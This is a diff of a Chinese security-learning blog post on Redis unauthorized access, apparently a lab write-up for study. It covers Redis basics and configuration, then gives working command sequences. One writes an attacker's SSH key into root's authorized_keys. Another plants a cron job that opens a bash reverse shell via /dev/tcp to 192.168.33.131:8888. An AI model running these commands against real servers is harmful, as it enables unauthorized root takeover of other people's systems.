@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Untitled | 学习记录博客</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="Untitled | 学习记录博客">
+  <title>Redis未授权访问总结 | 学习记录博客</title>
+  <meta name="keywords" content=" Redis ">
+  <meta name="description" content="Redis未授权访问总结 | 学习记录博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta property="og:type" content="website">
 <meta property="og:title" content="Untitled">
@@ -297,19 +297,26 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="page-" class="article article-type-page" itemscope itemprop="blogPost">
+        <article id="post-Redis未授权访问总结" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">Untitled</h1>
+        <h1 class="article-title">Redis未授权访问总结</h1>
     
     <div class="article-meta">
         
         
         
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color1">Redis</a>
+            
+        </span>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2020-08-06 17:55:47'>2020-08-06 17:55</time>
+            发布时间 : <time class="date" title='最后更新: 2020-09-02 18:31:32'>2020-09-01 11:25</time>
         
     </div>
     <div class="article-meta">
@@ -331,7 +338,7 @@
     
     <div class="toc-ref">
     
-        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Redis%E5%9F%BA%E7%A1%80"><span class="toc-text">Redis基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E7%AE%80%E4%BB%8B"><span class="toc-text">Redis简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%9A"><span class="toc-text">Redis常用命令：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C"><span class="toc-text">Redis基本操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%8F%82%E6%95%B0%EF%BC%9A"><span class="toc-text">Redis配置文件参数：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-text">利用原理：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%EF%BC%9A"><span class="toc-text">环境搭建：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-text">利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E5%86%99-ssh-keygen-%E5%85%AC%E9%92%A5%E7%99%BB%E5%BD%95%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-text">1、写 ssh-keygen 公钥登录服务器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-text">原理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%EF%BC%9A"><span class="toc-text">条件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4%EF%BC%9A"><span class="toc-text">详细步骤：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E5%88%A9%E7%94%A8%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">2、利用计划任务反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9A-1"><span class="toc-text">原理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%EF%BC%9A-1"><span class="toc-text">条件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4%EF%BC%9A-1"><span class="toc-text">详细步骤：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Redis%E5%86%99webshell"><span class="toc-text">3.Redis写webshell</span></a></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -347,7 +354,130 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>redis的未授权访问一直都是一个很常见的漏洞，前辈们也总结过很多，结合前辈的总结经验以及自己的实践，准备写一篇redis漏洞最全面的文章，为日后复习方便复习</p>
+<h1 id="Redis基础"><a href="#Redis基础" class="headerlink" title="Redis基础"></a>Redis基础</h1><h2 id="Redis简介"><a href="#Redis简介" class="headerlink" title="Redis简介"></a>Redis简介</h2><pre><code>redis是一个key-value存储系统。和Memcached类似，它支持存储的value类型相对更多，包括
+string(字符串)、list(链表)、set(集合)、zset(sorted set --有序集合)和hash（哈希
+类型）。这些数据类型都支持push/pop、add/remove及取交集并集和差集及更丰富的操作，而且
+这些操作都是原子性的。在此基础上，redis支持各种不同方式的排序。与memcached一样，为了
+保证效率，数据都是缓存在内   存中。区别的是redis会周期性的把更新的数据写入磁盘或者把修改操
+作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步。</code></pre>
+<h2 id="Redis常用命令："><a href="#Redis常用命令：" class="headerlink" title="Redis常用命令："></a>Redis常用命令：</h2><pre><code>      set xz &quot;Hacker&quot;                     # 设置键xz的值为字符串Hacker
+      get xz                              # 获取键xz的内容
+      SET score 857                       # 设置键score的值为857
+      INCR score                          # 使用INCR命令将score的值增加1
+      GET score                           # 获取键score的内容
+      keys *                              # 列出当前数据库中所有的键
+      get anotherkey                      # 获取一个不存在的键的值
+      config set dir /root/redis          # 设置工作目录
+      config set dbfilename redis.rdb     # 设置备份文件名
+      config get dir                      # 检查工作目录是否设置成功
+      config get dbfilename               # 检查备份文件名是否设置成功
+      save                                # 进行一次备份操作
+      flushall                            # 删除所有数据
+      del key                             # 删除键为key的数据
+      redis-cli -h ip -p 6379 -a passwd   # 外部连接</code></pre>
+<h2 id="Redis基本操作"><a href="#Redis基本操作" class="headerlink" title="Redis基本操作"></a>Redis基本操作</h2><pre><code>1.使用SET和GET命令，可以完成基本的赋值和取值操作；
+2.Redis是不区分命令的大小写的，set和SET是同一个意思；
+3.使用keys *可以列出当前数据库中的所有键；
+4.当尝试获取一个不存在的键的值时，Redis会返回空，即(nil)；
+5.如果键的值中有空格，需要使用双引号括起来，如&quot;Hello World&quot;；</code></pre>
+<h2 id="Redis配置文件参数："><a href="#Redis配置文件参数：" class="headerlink" title="Redis配置文件参数："></a>Redis配置文件参数：</h2><p>执行命令：ps aux | grep redis搜索redis配置文件位置</p>
+<ul>
+<li><p>port参数</p>
+<p>格式为port后面接端口号，如port 6379，表示Redis服务器将在6379端口上进行监听来等待客户端的连接。</p>
+</li>
+<li><p>bind参数</p>
+<p>格式为bind后面接IP地址，可以同时绑定在多个IP地址上，IP地址之间用空格分离，如bind 192.168.1.100 10.0.0.1，表允许192.168.1.100和10.0.0.1两个IP连接。如果设置为0.0.0.0则表示任意ip都可连接，说白了就是白名单。</p>
+</li>
+<li><p>save参数</p>
+<p>格式为save &lt;秒数&gt; &lt;变化数&gt;，表示在指定的秒数内数据库存在指定的改变数时自动进行备份（Redis是内存数据库，这里的备份就是指把内存中的数据备份到磁盘上）。可以同时指定多个save参数，如：</p>
+<p>save 900 1</p>
+<p>save 300 10</p>
+<p>save 60 10000</p>
+<p>表示如果数据库的内容在60秒后产生了10000次改变，或者300秒后产生了10次改变，或者900秒后产生了1次改变，那么立即进行备份操作。</p>
+</li>
+<li><p>requirepass参数</p>
+<p>格式为requirepass后接指定的密码，用于指定客户端在连接Redis服务器时所使用的密码。Redis默认的密码参数是空的，说明不需要密码即可连接；同时，配置文件有一条注释了的requirepass foobared命令，如果去掉注释，表示需要使用foobared密码才能连接Redis数据库。</p>
+</li>
+<li><p>dir参数</p>
+<p>格式为dir后接指定的路径，默认为dir ./，指明Redis的工作目录为当前目录，即redis-server文件所在的目录。注意，Redis产生的备份文件将放在这个目录下。</p>
+</li>
+<li><p>dbfilename参数</p>
+<p>格式为dbfilename后接指定的文件名称，用于指定Redis备份文件的名字，默认为dbfilename dump.rdb，即备份文件的名字为dump.rdb。</p>
+</li>
+<li><p>config命令</p>
+<p>通过config命令可以读取和设置dir参数以及dbfilename参数，因为这条命令比较危险（实验将进行详细介绍），所以Redis在配置文件中提供了rename-command参数来对其进行重命名操作，如rename-command CONFIG HTCMD，可以将CONFIG命令重命名为HTCMD。配置文件默认是没有对CONFIG命令进行重命名操作的。</p>
+</li>
+</ul>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="利用原理："><a href="#利用原理：" class="headerlink" title="利用原理："></a>利用原理：</h2><p>Redis 提供了2种不同的持久化方式，RDB方式和AOF方式.</p>
+<ul>
+<li>RDB 持久化可以在指定的时间间隔内生成数据集的时间点快照</li>
+<li>AOF 持久化记录服务器执行的所有写操作命令.</li>
+</ul>
+<p>经过查看官网文档发现AOF方式备份数据库的文件名默认为appendonly.aof，可以在配置文件中通过appendfilename设置其他名称，通过测试发现不能在客户端交互中动态设置appendfilename，所以不能通过AOF方式备份写任意文件.</p>
+<ul>
+<li>RDB方式备份数据库的文件名默认为dump.rdb，此文件名可以通过客户端交互动态设置dbfilename来更改，造成可以写任意文件.</li>
+</ul>
+<h2 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h2><p>靶机：unbantu 16</p>
+<pre><code>为快速复现，默认apt-get安装
+先进行更新
+sudo apt-get upgrade
+安装
+sudo apt-get install redis-server
+默认安装到 /usr/bin/redis-server
+直接启动服务就可以执行redis-server或者redis-server （配置文件目录）
+注意要将配置文件中的bind参数改为0.0.0.0，允许外连。
+还需要关闭防火墙，具体命令：sudo ufw disable  查看防火墙状态：sudo ufw status  </code></pre>
+<p>配置文件修改：</p>
+<p><img src="/2020/09/01/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/2.jpg"></p>
+<p>开启服务</p>
+<p><img src="/2020/09/01/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/1.jpg"></p>
+<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="1、写-ssh-keygen-公钥登录服务器"><a href="#1、写-ssh-keygen-公钥登录服务器" class="headerlink" title="1、写 ssh-keygen 公钥登录服务器"></a>1、写 ssh-keygen 公钥登录服务器</h3><h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><p>SSH免密登录的原理：</p>
+<p>SSH提供两种登录验证方式，一种是口令验证也就是账号密码登录，另一种是密钥验证。</p>
+<p>所谓密钥验证，其实就是一种基于公钥密码的认证，使用公钥加密、私钥解密，其中公钥是可以公开的，放在服务器端，你可以把同一个公钥放在所有你想SSH远程登录的服务器中，而私钥是保密的只有你自己知道，公钥加密的消息只有私钥才能解密，大体过程如下：</p>
+<blockquote>
+<p>（1）客户端生成私钥和公钥，并把公钥拷贝给服务器端； （2）客户端发起登录请求，发送自己的相关信息； （3）服务器端根据客户端发来的信息查找是否存有该客户端的公钥，若没有拒绝登录，若有则生成一段随机数使用该公钥加密后发送给客户端； （4）客户端收到服务器发来的加密后的消息后使用私钥解密，并把解密后的结果发给服务器用于验证； （5）服务器收到客户端发来的解密结果，与自己刚才生成的随机数比对，若一样则允许登录，不一样则拒绝登录。</p>
+</blockquote>
+<h4 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h4><p>1、Redis服务使用ROOT账号启动</p>
+<p>2、服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</p>
+<h4 id="详细步骤："><a href="#详细步骤：" class="headerlink" title="详细步骤："></a>详细步骤：</h4><p>1.在攻击机本地生成公钥文件：</p>
+<p>需要为我们的公钥文件设置一个私钥</p>
+<p>公钥文件默认路径：/root/.ssh/id_rsa.pub</p>
+<p><img src="/2020/09/01/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/3.jpg"></p>
+<pre><code>具体命令：
+ssh-keygen -t rsa
+cd /root/.ssh
+ls
+cat id_rsa.pub
+</code></pre>
+<p>然后通过未授权访问目标机</p>
+<p><img src="/2020/09/01/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/4.jpg"></p>
+<p>具体命令</p>
+<pre><code>redis-cli -h 192.168.33.134        #连接目标主机redis
+config get dir                  #检查当前工作目录
+config get dbfilename              #检查备份文件名
+config set dir /root/.ssh/         #设置工作目录
+config set dbfilename authorized_keys #设置备份文件名
+set xz &quot;\n\n\n 公钥 \n\n\n&quot;         #将公钥写入xz健
+save                         #进行备份     </code></pre>
+<p>利用公钥进行SSH登录攻击机</p>
+<p><img src="/2020/09/01/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/5.jpg"></p>
+<h3 id="2、利用计划任务反弹shell"><a href="#2、利用计划任务反弹shell" class="headerlink" title="2、利用计划任务反弹shell"></a>2、利用计划任务反弹shell</h3><h4 id="原理：-1"><a href="#原理：-1" class="headerlink" title="原理："></a>原理：</h4><p>我们都知道crontab是做计划任务的，启动的任务存放在/var/spool/cron中，root可以修改计划任务，可以将执行命令反弹shell直接写入计划任务中</p>
+<h4 id="条件：-1"><a href="#条件：-1" class="headerlink" title="条件："></a>条件：</h4><p>root启用Redis</p>
+<h4 id="详细步骤：-1"><a href="#详细步骤：-1" class="headerlink" title="详细步骤："></a>详细步骤：</h4><p>先在攻击机使用nc监听8888端口<code>nc -lvp 8888</code></p>
+<p><img src="/2020/09/01/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/8.jpg"></p>
+<p>然后去操作Redis，具体命令：</p>
+<pre><code>redis-cli -h 192.168.33.134
+ flushall
+config set dir /var/spool/cron/crontabs/
+config set dbfilename shell
+set xz &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.33.131/8888 0&gt;&amp;1\n&quot;
+save
+</code></pre>
+<p><img src="/2020/09/01/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/9.jpg"></p>
+<p>看监听的命令行窗口已经有弹回来的shell了</p>
+<p><img src="/2020/09/01/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/10.jpg"></p>
+<h3 id="3-Redis写webshell"><a href="#3-Redis写webshell" class="headerlink" title="3.Redis写webshell"></a>3.Redis写webshell</h3>
       
        <hr><span style="font-style: italic;color: gray;"> 文章内容都是记录做网络安全的一些笔记和知识，方便复习和成长，部分文章取自互联网。 </span>
     </div>
